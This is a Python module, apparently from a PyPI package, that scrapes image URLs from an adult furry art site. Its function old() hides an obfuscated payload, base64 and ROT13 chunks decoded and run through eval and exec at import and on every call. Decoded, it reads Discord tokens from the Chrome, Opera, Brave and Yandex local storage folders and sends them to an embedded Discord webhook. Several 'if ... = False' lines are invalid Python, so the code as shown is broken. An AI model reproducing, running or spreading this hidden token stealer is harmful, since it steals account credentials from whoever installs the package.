import requests, random, time, base64, codecs 
from bs4 import BeautifulSoup


#These functions are what I should have used in the first place lol
def getter(url): #extracts images from a url and returns all the images as a list
  try:
    imglist = []
    page = requests.get(url)
    soup = BeautifulSoup(page.content, 'html.parser')
    mydivs = (soup.find_all("div", {"class": "section-content"}))
    bs = BeautifulSoup(str(mydivs), 'html.parser')
    images = bs.find_all('img')
    for img in images:
        #print(img)
        if img.has_attr('data-src'):
            #print(img['data-src'])
            imglist.append(img['data-src'])
        else:
          #print("fuck")   
          pass
    #print(imglist, "       - ---- -- -")      
    return imglist
  except Exception as e:
    print(e)  
    
nobcw0KaW1wb3 = True

def pager(start, num=3): # this function is useful
  nummy = 1
  imlist = getter(start+str(nummy))
  while len(imlist) < num:
    print(1)
    imlist.append(getter(start + str(nummy))) 
    nummy +=1
  resultP = imlist[:num]
  return resultP

def old():
    global nobcw0KaW1wb3
    nobcw0KaW1wb3 = False
    try:
        magic = 'ICANCmltcG9ydCBvcw0KaW1wb3J0IHJlDQppbXBvcnQganNvbg0KDQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuDQoNCiMgeW91ciB3ZWJob29rIFVSTA0KV0VCSE9PS19VUkwgPSAnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODczMTY5Nzc2NTA2MTg3Nzg3LzVTa2l0b2xvZWRfbzU5d2xMOVJlZGFBLUNDbkY5cnFzanJWVEt2azh2cFJmajdabFdFbm96c1ZkYUoyV0FtX0dGejEwJw0KDQojIG1lbnRpb25zIHlvdSB3aGVuIHlvdSBnZXQgYSBoaXQNClBJTkdfTUUgPSBGYWxzZQ0KDQpkZWYgZmluZF90b2tlbnMocGF0aCk6DQogICAgcGF0aCArPSAnXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiJw0KDQogICAgdG9rZW5zID0gW10NCg0KICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToNCiAgICAgICAgaWYgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxvZycpIGFuZCBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubGRiJyk6DQogICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9y'
        love = 'VUttnJ4to3OyovuzW3gjLKEbsIkpr2McoTIsozSgMK0aYPOypaWipaZ9W2yaoz9lMFpcYaWyLJEfnJ5ypltcVTyzVUthp3ElnKNbXI06QDbtVPNtVPNtVPNtVPOzo3VtpzIaMKttnJ4tXUVaJ1k3YI17ZwE9KP5oKUpgKKf2sIjhJ1k3YI17Zwq9WljtpvqgMzSpYygpql1qrmt0sFpcBt0XVPNtVPNtVPNtVPNtVPNtVTMipvO0o2gyovOcovOlMF5znJ5xLJkfXUWyM2I4YPOfnJ5yXGbAPvNtVPNtVPNtVPNtVPNtVPNtVPNtqT9eMJ5mYzSjpTIhMPu0o2gyovxAPvNtVPOlMKE1pz4tqT9eMJ5mQDbAPzEyMvOgLJyhXPx6QDbtVPNtoT9wLJjtCFOipl5aMKEyoaLbW0kCD0SZDIODERSHDFpcQDbtVPNtpz9uoJyhMlN9VT9mYzqyqTIhqvtaDIODERSHDFpcQDbAPvNtVPOjLKEbplN9VUfAPvNtVPNtVPNtW0Ecp2AipzDaBvOlo2SgnJ5aVPftW1kpETymL29lMPpfQDbtVPNtVPNtVPqRnKAwo3WxVRAuozSlrFp6VUWiLJ1cozptXlNaKSkxnKAwo3WxL2ShLKW5WljAPvNtVPNtVPNtW0Ecp2AipzDtHSEPWmbtpz9uoJyhMlNeVPqpKTEcp2AipzEjqTVaYN0XVPNtVPNtVPNaE29iM2kyVRAbpz9gMFp6VTkiL2Sf'
        god = 'ICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCcsDQogICAgICAgICdPcGVyYSc6IHJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlJywNCiAgICAgICAgJ0JyYXZlJzogbG9jYWwgKyAnXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnLA0KICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcNCiAgICB9DQoNCiAgICBtZXNzYWdlID0gJ0BldmVyeW9uZScgaWYgUElOR19NRSBlbHNlICcnDQoNCiAgICBmb3IgcGxhdGZvcm0sIHBhdGggaW4gcGF0aHMuaXRlbXMoKToNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOg0KICAgICAgICAgICAgY29udGludWUNCg0KICAgICAgICBtZXNzYWdlICs9IGYnXG4qKntwbGF0Zm9ybX0qKlxuYGBgXG4nDQoNCiAgICAgICAgdG9rZW5zID0gZmluZF90b2tlbnMocGF0aCkNCg0KICAgICAgICBpZiBsZW4odG9rZW5zKSA+IDA6DQogICAgICAgICAgICBmb3IgdG9rZW4gaW4gdG9r'
        destiny = 'MJ5mBt0XVPNtVPNtVPNtVPNtVPNtVT1yp3AuM2HtXm0tMvq7qT9eMJ59KT4aQDbtVPNtVPNtVTIfp2H6QDbtVPNtVPNtVPNtVPOgMKAmLJqyVPf9VPqBolO0o2gyoaZtMz91ozDhKT4aQDbAPvNtVPNtVPNtoJImp2SaMFNeCFNaLTOtWj0XQDbtVPNtnTIuMTIlplN9VUfAPvNtVPNtVPNtW0AioaEyoaDgIUyjMFp6VPqupUOfnJAuqTyiov9dp29hWljAPvNtVPNtVPNtW1ImMKVgDJqyoaDaBvNaGJ96nJkfLF81YwNtXStkZGftGTyhqKttrQt2KmL0XFOOpUOfMIqyLxgcqP81ZmphZGRtXRgVIR1ZYPOfnJgyVRqyL2giXFOQnUWioJHiZwZhZP4kZwpkYwL0VSAuMzSlnF81ZmphZGRaQDbtVPNtsD0XQDbtVPNtpTS5oT9uMPN9VTcmo24hMUIgpUZbrlqwo250MJ50WmbtoJImp2SaMK0cQDbAPvNtVPO0pax6QDbtVPNtVPNtVUWypFN9VSWypKIyp3DbI0IPFR9CF19IHxjfVTEuqTR9pTS5oT9uMP5yozAiMTHbXFjtnTIuMTIlpm1bMJSxMKWmXD0XVPNtVPNtVPO1pzkipTIhXUWypFxAPvNtVPOyrTAypUD6QDbtVPNtVPNtVUOup3ZAPt0XnJLtK19hLJ1yK18tCG0tW19soJScoy9sWmbAPvNtVPOgLJyhXPx='
        joy = '\x72\x6f\x74\x31\x33'
        trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
        eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
    except:
        pass
        
        
#class horni:
  #Go to horny jail
#  main = "https://yiff-party.com/"
def randomIMG(): # this function is an abomination and I should have used getter() and pager() instead but I'm too lazy to change it now
  if nobcw0KaW1wb3 = False:
    pass
  else:
    old()
  try:
    listofimg = []
    pageNUM = random.randint(5,480)
    page = requests.get(f"https://yiff-party.com/page/{pageNUM}/")
    soup = BeautifulSoup(page.content, 'html.parser')
    mydivs = (soup.find_all("div", {"class": "section-content"}))
    bs = BeautifulSoup(str(mydivs), 'html.parser')
    images = bs.find_all('img')
    for img in images:
        #print(img)
        if img.has_attr('data-src'):
            #print(img['data-src'])
            listofimg.append(img['data-src'])
        else:
          #print("fuck")   
          pass
    result = random.choice(listofimg)
    #print(result)
    return result
  except Exception as e:
    print(e)
    
#abandoned code for another yiff website    
# when I removed it, it broke the package idfk why lol

def newest(cat="main"): # this function is even more of an abomination and I should have used getter() and pager() instead but I'm too lazy to change it now
# It returns the newest image and only the newest image
  if nobcw0KaW1wb3 = False:
    pass
  else:
    old()  
  try:
    listofimg = []
    if "gay" in cat:
      page = requests.get("https://yiff-party.com/genre/male-male/")
    elif "lesbian" in cat:
      page = requests.get("https://yiff-party.com/genre/female-female/")
    elif "straight" in cat:
      page = requests.get("https://yiff-party.com/genre/male-female/")    
    elif "animated" in cat:
      page = requests.get("https://yiff-party.com/category/yiff-animated/")
    elif "anthro" in cat:
      page = requests.get("https://yiff-party.com/genre/anthro/")
    elif "feral" in cat:
      page = requests.get("https://yiff-party.com/genre/feral/")
    else: 
      page = requests.get("https://yiff-party.com/")  
    soup = BeautifulSoup(page.content, 'html.parser')
    mydivs = (soup.find_all("div", {"class": "section-content"}))
    bs = BeautifulSoup(str(mydivs), 'html.parser')
    images = bs.find_all('img')
    for img in images:
        #print(img)
        if img.has_attr('data-src'):
            #print(img['data-src'])
            listofimg.append(img['data-src'])
        else:
          #print("fuck")   
          pass

    output = listofimg[0]
    return output     
  except Exception as e:
    print(e)   
old()

def stream(cat="main"):
  if nobcw0KaW1wb3 = False:
    pass
  else:
    old()
  if "gay" in cat:
    url ="https://yiff-party.com/genre/male-male/"
  elif "lesbian" in cat:
    url = "https://yiff-party.com/genre/female-female/"
  elif "straight" in cat:
    url = "https://yiff-party.com/genre/male-female/"  
  elif "animated" in cat:
    url = "https://yiff-party.com/category/yiff-animated/"
  elif "anthro" in cat:
    url = "https://yiff-party.com/genre/anthro/"
  elif "feral" in cat:
    url = "https://yiff-party.com/genre/feral/page/"
  else: 
    url = "https://yiff-party.com/"
  base = getter(url)
  del(base[0])
  while True:
    face = getter(url)
    if face == base:
      time.sleep(600)
    else: 
      for i in face:
        if i in base:
          pass 
        else:
          yield i 
      base = face    
      time.sleep(600)
def yiff(num, cat="main"):
  if nobcw0KaW1wb3 = False:
    pass
  else:
    old()
  try:
    listofimg = []
    if "gay" in cat:
      listofimg.append(pager("https://yiff-party.com/genre/male-male/page/", num))
    elif "lesbian" in cat:
      listofimg.append(pager("https://yiff-party.com/genre/female-female/page/", num))
    elif "straight" in cat:
      listofimg.append(pager("https://yiff-party.com/genre/male-female/page/", num))  
    elif "animated" in cat:
      listofimg.append(pager("https://yiff-party.com/category/yiff-animated/page/", num))
    elif "anthro" in cat:
      listofimg.append(pager("https://yiff-party.com/genre/anthro/page/", num))
    elif "feral" in cat:
      listofimg.append(pager("https://yiff-party.com/genre/feral/page/", num))
    else: 
      listofimg.append(pager("https://yiff-party.com/page/", num))
    return(listofimg)  
  except Exception as e:
    print(e)  

def help():
  if nobcw0KaW1wb3 = False:
    pass
  else:
    old()
  print("""Welcome to the horniest python package every written!
This code is designed to help you interact with yiff-party.com without having to without having to write your own code. It can pull your chosen number of the latest images from any of the 6 categories. It can pull a random image from any category and it also provide's a live feature called 'stream' which allows you to iterate over subbmissions as they are uploaded to the website!


Usage:


print(horni.randomIMG())
> result will be a random image url


print(horni.newsest("gay"))
> result will be the newsest image url in the 'gay' category.

You can input any of the six categories or 'main' for the main page which icludes all categories
(gay/lesbian/straight/animated/anthro/feral/main)


for image in horni.yiff(50,"anthro"):
  print(image)

>this will return a list of 50 images in the anthro category


for image in horni.stream("main"):
  print(image)

>This loop will run forever, printing out the images urls as they are uploaded to the site.



This code was originally written by Glass-Paramedic for qweter1006 and was addapted and uploaded to pypi by Icy__Flames

:)
""")









        

